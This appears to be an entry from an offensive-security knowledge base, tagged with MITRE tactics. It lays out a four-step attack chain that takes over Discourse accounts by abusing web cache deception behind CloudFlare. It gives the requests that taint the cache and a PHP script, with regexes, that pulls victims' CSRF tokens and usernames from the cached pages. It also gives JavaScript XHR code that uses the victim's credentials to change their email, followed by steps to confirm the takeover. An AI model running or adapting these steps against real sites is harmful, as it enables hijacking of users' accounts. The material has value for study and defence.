---
tags:
  - web-cache-deception
  - csrf-exposure
  - account-takeover
  - cloudflare
type: attack_chain
tools:
  - '[[tools/CloudFlare]]'
tactics:
  - '[[Initial Access]]'
  - '[[Persistence]]'
  - '[[Collection]]'
commands:
  - '[[commands/request-non-existent-user-page-css]]'
  - '[[commands/request-page-to-trigger-caching]]'
  - '[[commands/php-file-get-contents-cached-page]]'
  - '[[commands/php-preg-match-csrf-token]]'
  - '[[commands/php-preg-match-username]]'
  - '[[commands/xhr-open-post-email-change]]'
  - '[[commands/xhr-set-request-header-accept]]'
  - '[[commands/xhr-set-request-header-content-type]]'
  - '[[commands/xhr-with-credentials-true]]'
  - '[[commands/construct-email-change-body]]'
  - '[[commands/xhr-send-blob]]'
platforms:
  - Web
complexity: medium
procedures:
  - '[[procedures/Taint-CloudFlare-Cache-with-Victim-Data]]'
  - '[[procedures/Fetch-Cached-Data-Server-Side]]'
  - '[[procedures/Change-Victim-Email-Using-Extracted-CSRF]]'
  - '[[procedures/Verify-Email-Change]]'
step_count: 4
techniques:
  - '[[Drive-by Compromise]]'
  - '[[Exploit Public-Facing Application]]'
  - '[[Steal Web Session Cookie]]'
description: >-
  Exploits Web Cache Deception in Discourse instances proxied by CloudFlare to
  expose CSRF tokens and usernames, enabling account takeover via email change.
skill_level: intermediate
impact_level: high
id: f88f2a8d-8324-4008-b8d1-c681b40a4f13
created_at: '2025-12-13T09:00:34.505Z'
updated_at: '2025-12-13T09:00:34.505Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Persistence]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[Exploit Public-Facing Application]]'
  - '[[Steal Web Session Cookie]]'
---
# Web Cache Deception in Discourse via CloudFlare for Account Takeover

Multi-stage attack chain exploiting a Web Cache Deception vulnerability in Discourse instances behind CloudFlare, leading to exposure of CSRF tokens and usernames, and ultimately account takeover by changing the victim's email.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Cache Tainting] --> B[Fetch Cached Data]
    B --> C[Change Email]
    C --> D[Verify Change]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/CloudFlare]]

### Target Environment

- Web platform
- Discourse service behind CloudFlare proxy
- Network access to the Discourse instance

### Initial Access Requirements

- Victim must be signed into the Discourse instance
- Attacker needs a malicious page to trick the victim into visiting
- Attacker must be in the same CloudFlare region as the victim

## Detailed Attack Procedures

### Step 1: Taint CloudFlare Cache with Victim Data
procedure: [[procedures/Taint-CloudFlare-Cache-with-Victim-Data]]

**Objective**: Force the victim's browser to load specific Discourse URLs with .css extension to taint the CloudFlare cache with sensitive data like CSRF token and username.

**Instructions**: The victim visits a malicious page containing img tags that load URLs like /u/$rand.css on the Discourse instance. Use [[commands/request-non-existent-user-page-css]] to demonstrate exposure:

```bash
GET /u/x.css HTTP/1.1
Host: try.discourse.org
```

Then, use [[commands/request-page-to-trigger-caching]] to trigger caching by requesting the page twice while signed in:

```bash
GET /u/x.css HTTP/1.1
```

**Expected Output**: CloudFlare cache is tainted with the victim's CSRF token and username in the response.

**Success Indicators**:
- Cache status shows HIT on subsequent requests
- Sensitive data appears in cached responses

### Step 2: Fetch Cached Data Server-Side
procedure: [[procedures/Fetch-Cached-Data-Server-Side]]

**Objective**: Retrieve the cached content from CloudFlare using a server-side script to extract the CSRF token and username.

**Instructions**: Use a PHP script to fetch the cached page with [[commands/php-file-get-contents-cached-page]]:

```php
$data = file_get_contents($discourse.'/u/'.$f.'.css', false, $ctx);
```

Extract the CSRF token using [[commands/php-preg-match-csrf-token]]:

```php
preg_match('/name="csrf-token" content="([a-zA-Z0-9\/=+]+)"/',$data,$matches);
```

Extract the username using [[commands/php-preg-match-username]]:

```php
preg_match('/X-Discourse-Username: (.*)/', implode("\n", $http_response_header), $name_matches);
```

**Expected Output**: Extracted CSRF token and username from the cached response.

**Success Indicators**:
- Valid CSRF token matched
- Username extracted from headers

### Step 3: Change Victim Email Using Extracted CSRF
procedure: [[procedures/Change-Victim-Email-Using-Extracted-CSRF]]

**Objective**: Craft and send a POST request to change the victim's email using the extracted CSRF token and username.

**Instructions**: Prepare the XMLHttpRequest with [[commands/xhr-open-post-email-change]]:

```javascript
xhr.open("POST", "https://discourse.instance.behind.cloudflare.proxy/users/" + user + "/preferences/email.json", true);
```

Set headers with [[commands/xhr-set-request-header-accept]] and [[commands/xhr-set-request-header-content-type]]:

```javascript
xhr.setRequestHeader("Accept", "text/html");
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
```

Enable credentials with [[commands/xhr-with-credentials-true]]:

```javascript
xhr.withCredentials = true;
```

Construct the body with [[commands/construct-email-change-body]]:

```javascript
var body = "_method=PUT&email=" + encodeURIComponent(change_email_to) + "&authenticity_token=" + encodeURIComponent(csrf);
```

Send the request with [[commands/xhr-send-blob]]:

```javascript
xhr.send(new Blob([aBody]));
```

**Expected Output**: Successful POST request triggering email change notification.

**Success Indicators**:
- 200 OK response from the server
- Email change initiated

### Step 4: Verify Email Change
procedure: [[procedures/Verify-Email-Change]]

**Objective**: Complete the account takeover by verifying the email change via the attacker's inbox.

**Instructions**: The attacker receives a verification email and clicks the link to confirm the change. No specific command is needed, but monitor for the email notification.

**Expected Output**: Verification link clicked, email changed to attacker's control.

**Success Indicators**:
- Email verification successful
- Victim's account email updated to attacker's

## Attack Chain Summary

### Key Achievements

1. Exposed sensitive user data via cache deception
2. Extracted CSRF token and username
3. Achieved account takeover through email change

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Drive-by Compromise]]
- [[Exploit Public-Facing Application]]
- [[Steal Web Session Cookie]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Persistence]]
- [[Collection]]

*Last updated: [TIMESTAMP]*
